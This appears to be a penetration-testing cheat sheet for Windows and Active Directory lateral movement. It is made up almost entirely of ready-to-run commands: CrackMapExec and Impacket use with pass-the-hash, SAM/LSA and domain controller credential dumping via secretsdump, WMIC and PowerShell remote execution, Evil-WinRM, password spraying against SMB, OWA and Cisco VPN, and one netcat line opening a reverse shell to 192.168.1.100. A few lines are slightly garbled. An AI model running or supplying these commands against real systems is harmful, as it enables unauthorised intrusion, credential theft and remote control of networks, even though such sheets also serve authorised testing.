### Crackmapexec
```
cme-hosts.txt -u username.txt -p password.txt --shares 
crackmapexec smb 192.168.1.1/24 -u Administrator -p '123456@!' -x "net users" 
crackmapexec smb 192.168.1.1/24 -u Administrator -H <NTLM Hash>  -x "hostname" 
crackmapexec smb 192.168.1.10 -u Administrator -H <NTLM Hash> --sam            
crackmapexec smb 192.168.1.10 -u Administrator -H  <NTLM Hash> --lsa            
psexec \\192.168.1.199 -u Administrator -p 123456Ww ipconfig

```
### Impacket Library
```
psexec.py Resilient-Ninja:123456@192.168.1.100 ipconfig 
wmiexec.py Resilient-Ninja:123456@192.168.1.100 ipconfig 
python wmiexec.py -hashes <NTLM Hash> Administrator@192.168.1.100 
python secretsdump.py -hashes <NTLM Hash> -just-dc insomina.io/Administrator@192.168.1.100

```

### Windows Management Instrumentation

```
wmic /node:"ComputerName" /user:"insomnia.io\john" /password:"1234567@" process call create "powershell -enc <>"
WMIGrunt wkstn-4945 PowerShell insomnia\john 1234567@
WMIGrunt wkstn-4945 PowerShell

```
### Pass the Ticket with Windows Management Instrumentation
```
wmic /authority:"Kerberos: Domain DC_Hostname“ / DC_hostname process call create 
wmic /authority:"kerberos:contoso.local\district" /node:district.contoso.local path win32_process call create calc.exe
wmic /authority:"kerberos:contoso.local\district" /node:district.contoso.local "cmd /c ipconfig"
wmic /authority:"Kerberos:DOMAIN REMOTE" /node:REMOTE process call create " Windows System32 nodepad.exe"
```
  ### PowerShell Remoting
 ```
ImpersonateUser CYBER\n.lamb
MakeToken n.lamb cyberbotic.io F3rrari
PowerShell Invoke-Command -ComputerName wkstn-4945 -ScriptBlock { hostname; whoami }
PowerShell $pass=ConvertTo-SecureString "F3rrari" -AsPlainText -Force; $cred=New-Object System.Management.Automation.PSCredential("cyberbotic.io\n.lamb", $pass); Invoke-Command -ComputerName wkstn-4945 -ScriptBlock { hostname; whoami } -Credential $cred
```




### PowerShell Remoting 
```
Invoke-Command -ComputerName john.insomnia.io -Credential $Cred  -ScriptBlock {hostname}
Invoke-Command -ComputerName john.insomnia.io -Credential $Cred  -ScriptBlock {cmd.exe /c nc.exe -v 192.168.1.100 7777 -e cmd.exe}
```


### Evil-WinRM
 
```
proxychains evil-winrm -u john -H <NTLM Hash> -i 192.168.199
```

 ### Password Spraying Attack 
```

crackmapexec smb 192.168.1.1  -d insomnia.io -u john -P /usr/share/wordlists/rockyou.txt
smbclient -N -L \\\\192.168.1.199 | grep Disk | sed 's/^\s*\(.*\)\s*Disk.*/\1/' 
crackmapexec smb 192.168.1.199 -u John -H NTLM Hash 
crackmapexec smb 192.168.1.99 -u '' -p '' #NULL Sessions
spray.sh -smb 192.168.1.100 users.txt /usr/share/wordlists/rockyou.txt  1 35 insomnia.io
spray.sh -owa 192.168.1.100 users.txt  /usr/share/wordlists/rockyou.txt   1 35 Request.body #OWA
spray.sh -cisco 192.168.1.100 usernames.txt /usr/share/wordlists/rockyou.txt 1 35 #CISCO Web VPN
python atomizer.py owa insomnia.io '123456@' emails.txt
```
### Runas
```
runas /netonly /user:nyameeeain "C:\Windows\System32\calc.exe"
runas /netonly /user:nyameeeain powershell
runas /netonly /user:insomnia\nyameeeain "C:\Windows\System32\calc.exe"
```

